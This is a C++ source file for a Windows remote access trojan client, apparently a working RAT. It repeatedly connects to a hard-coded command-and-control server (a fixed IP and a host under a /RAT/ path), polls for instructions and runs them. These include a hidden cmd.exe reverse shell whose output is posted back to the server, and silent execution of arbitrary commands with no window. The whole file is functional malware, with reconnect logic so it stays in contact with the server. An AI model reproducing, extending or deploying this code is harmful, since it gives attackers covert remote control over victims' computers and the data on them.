#include <winsock2.h>
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <thread>
#include <sstream>                                                              // Include for stringstream
#include <mutex>

using namespace std;
#pragma comment(lib, "ws2_32.lib")

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
bool connected = false;

std::mutex mtx;
std::mutex socketMutex; 
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool socket_setup(SOCKET &clientSocket);
void safe_closesocket(SOCKET &clientSocket);

void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
string receive_data(SOCKET &clientSocket, const string &filename);

bool ExecuteCommand(const std::string& command);
void give_command(const std::string &command);
void rev_shell(SOCKET &clientSocket);
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

int main()
{
    SOCKET sock = INVALID_SOCKET;

    bool outerloop = true;
    while(outerloop)
    {
        connected = socket_setup(sock);
        //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        bool loop = true;
        while(loop)
        {
            if(receive_data(sock,"from_server.txt")[0] == '`')
            {
                Sleep(1000);
                cout<< "waiting for data " << endl;
            }
            else
            {
                char option = receive_data(sock,"from_server.txt")[0];
                cout << "option: " << option << endl;
                switch (option)
                {
                    case '2':                                                                                     //rev shell
                    {
                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
                        cout << "mark the file read [switch] inside case 2" << endl;
                        
                        rev_shell(sock);
                        break;
                    }

                    case '3':                                                                                     //keystroke injection
                    {
                        
                        if(receive_data(sock,"from_server.txt")[0] == '`')
                        {
                            Sleep(100);
                            cout<< "waiting for payload " << endl;
                        }      
                        else
                        {
                            string payload = (receive_data(sock,"from_server.txt").substr(1));
                            //cout << "Recieved after waiting ->" << payload << endl;
                            ExecuteCommand(payload);
                        }
                        
                        send_data(sock,"from_server.txt","`");
                        //cout << "mark the received command as read [switch3]" << endl;
                        break;
                    }

                    case '~':                                                                                    //dc from server
                    {
                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
                        cout << "mark the file read [switch] inside case ~" << endl;
                        
                        std::cout << "Server initiated disconnect.\n";
                        loop = false;
                        connected = false;
                        
                        break;
                    }
                    case '#':                                                                                    //end all
                    {
                        send_data(sock,"from_server.txt","`");                                                    //mark the file read(switch)
                        cout << "mark the file read [switch] inside case #" << endl;
                        
                        loop = false;
                        outerloop = false;
                        
                        break;
                    }
                    default:
                    {
                        cout << "mark the file read [switch] inside default" << "->\n";
                        cout << receive_data(sock,"from_server.txt") << endl;

                        //send_data(sock,"from_server.txt","`");                                                //mark the file read(switch)
                        
                        
                        break;
                    }
                }
            }
        }

        if (outerloop && !connected)
        {
            cout << "Waiting 5 sec to reconnect...\n";
            Sleep(5000);
        }

    }

    return 0;
}

bool ExecuteCommand(const std::string& command)
{
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Convert std::string to std::wstring
    int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, NULL, 0);
    std::wstring wcommand(wlen, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcommand[0], wlen);

    std::wstring cmdLine = L"cmd.exe /c " + wcommand;

    if(!CreateProcessW(NULL,const_cast<wchar_t*>(cmdLine.c_str()),NULL,NULL,FALSE,CREATE_NO_WINDOW, NULL,NULL,&si,&pi))
    {
        std::cerr << "CreateProcess failed with error code: " << GetLastError() << std::endl;
        return false;
    }             

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

void give_command(const std::string &command)
{
    string cmd = command + "\r\n";
    // Write a command to the child process.
    DWORD bytesWritten;
    if (!WriteFile(hChildStdInWrite, cmd.c_str(), cmd.length(), &bytesWritten, NULL))
    {
        cerr << "WriteFile failed with error code: " << GetLastError() << endl;
    }
    FlushFileBuffers(hChildStdInWrite); // Ensure the command is sent.
}

void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
{
    {
        lock_guard<mutex> lock1(socketMutex); 
        
        socket_setup(clientSocket);

        string whole_data = filename+data;
        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
        httpRequest += "Host: arth.imbeddex.com\r\n";
        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
        httpRequest += "Content-Type: application/octet-stream\r\n";
        httpRequest += "Connection: close\r\n\r\n";
        httpRequest += whole_data;                                                                // Append the actual data


        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        }
    
        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                receivedData += buffer; // Append to the received data
            } else if (bytesReceived == 0) {
                cerr << "Connection closed by server." << endl;
                break; // Exit the loop on clean close
            } else {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) {
                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                }
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

        //cout << "\n\nReceived: " << receivedData << endl;

        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////

        safe_closesocket(clientSocket);
    }
}

string receive_data(SOCKET &clientSocket, const string &filename)
{
    {
        lock_guard<mutex> lock1(socketMutex);

        socket_setup(clientSocket);

        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
        httpRequest += "Host: arth.imbeddex.com\r\n";
        httpRequest += "Connection: close\r\n\r\n";

        //cout<< httpRequest<<endl;

        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator

            if (bytesReceived > 0) {
                buffer[bytesReceived] = '\0';
                receivedData += buffer; // Append to the received data
            } else if (bytesReceived == 0) {
                cerr << "Connection closed by server." << endl;
                break; // Exit the loop on clean close
            } else {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) {
                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
                }
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full

        //cout << "\n\nReceived: \n" << receivedData << endl;

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        // Robust HTTP response parsing
        size_t headerEnd = receivedData.find("\r\n\r\n");
        if (headerEnd == string::npos) {
            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
            return "";
        }

        string body = receivedData.substr(headerEnd + 4);

        //Handle chunked transfer encoding (if present)
        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
        if (transferEncodingPos != string::npos)
        {
            string unchunkedBody;
            istringstream bodyStream(body);
            string chunkLengthStr;

            while (getline(bodyStream, chunkLengthStr))
            {
                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

                size_t chunkSize;
                stringstream ss;
                ss << hex << chunkLengthStr;
                ss >> chunkSize;

                if (chunkSize == 0) break; // End of chunked data

                string chunkData(chunkSize, '\0');
                bodyStream.read(&chunkData[0], chunkSize);

                unchunkedBody += chunkData;
                bodyStream.ignore(2); // Consume CRLF after chunk
            }
            body = unchunkedBody;
        }
        safe_closesocket(clientSocket);

        //send_data(clientSocket, "from_server.txt", "`");
        return body;

    }
}

void rev_shell(SOCKET &clientSocket)
{

    SECURITY_ATTRIBUTES saAttr = {0};
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;

    // Create pipes for child process's STDOUT.
    CreatePipe(&hChildStdOutRead, &hChildStdOutWrite, &saAttr, 0);
    SetHandleInformation(hChildStdOutRead, HANDLE_FLAG_INHERIT, 0);

    // Create pipes for child process's STDIN.
    CreatePipe(&hChildStdInRead, &hChildStdInWrite, &saAttr, 0);
    SetHandleInformation(hChildStdInWrite, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hChildStdOutWrite;
    si.hStdError = hChildStdOutWrite;
    si.hStdInput = hChildStdInRead;

    PROCESS_INFORMATION pi = {0};
    wchar_t command[] = L"cmd.exe";
    if (!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        cerr << "CreateProcess failed with error code: " << GetLastError() << endl;
        //return 1;
    }

    // Close handles not needed by the parent.
    CloseHandle(hChildStdOutWrite);
    CloseHandle(hChildStdInRead);

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    atomic<bool> processFinished(false);
    
    // Lambda for reading from the child process stdout
    auto readThread = std::thread([&]()
    {
        const size_t bufferSize = 4096;
        char buffer[bufferSize];
        DWORD bytesRead;

        while (!processFinished.load())
        {            

            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
            {
                if (bytesRead > 0) 
                {
                    buffer[bytesRead] = '\0';
                    cout << buffer;
                    send_data(clientSocket, "from_client.txt" ,buffer);
                }
            } 
            else if (GetLastError() == ERROR_BROKEN_PIPE)
            {
                // End of data
                break;
            }

            Sleep(100); // Sleep for a short time to prevent 100% CPU usage
        } 
    });

    // Lambda to handle writing to child process's stdin
    auto writeThread = std::thread([&]()
    {
        string cmd;
        while (!processFinished.load())  // Check if process is finished
        {

        Sleep(100);

        if(receive_data(clientSocket,"from_server.txt")[0] == '`')
        {
            //cout<< "waiting for rev shell data " << endl;
            continue;
        }
        
        cmd = receive_data(clientSocket, "from_server.txt");
        send_data(clientSocket,"from_server.txt","`");
        if (cmd == "exit")
        {
            processFinished.store(true); // Signal to stop reading thread
            send_data(clientSocket,"from_client.txt","`");
            break;
        }

        // Send the command to the child process's stdin
        give_command(cmd);
           
        }
    });

    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    // Wait for process threads to finish
    writeThread.join();
    processFinished.store(true);

    // Close stdin and terminate child process
    string exitCmd = "exit\r\n";
    DWORD bytesWritten;
    WriteFile(hChildStdInWrite, exitCmd.c_str(), exitCmd.length(), &bytesWritten, NULL);
    FlushFileBuffers(hChildStdInWrite);

    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    readThread.join();
    CloseHandle(hChildStdOutRead);
    CloseHandle(hChildStdInWrite);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);    

}

void safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);
        
        clientSocket = INVALID_SOCKET;
    }
}

bool socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    connected = false;
    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else
        {
            //std::cout << "Connected to the server!\n";
            connected = true;
        }
    }
    return true;
}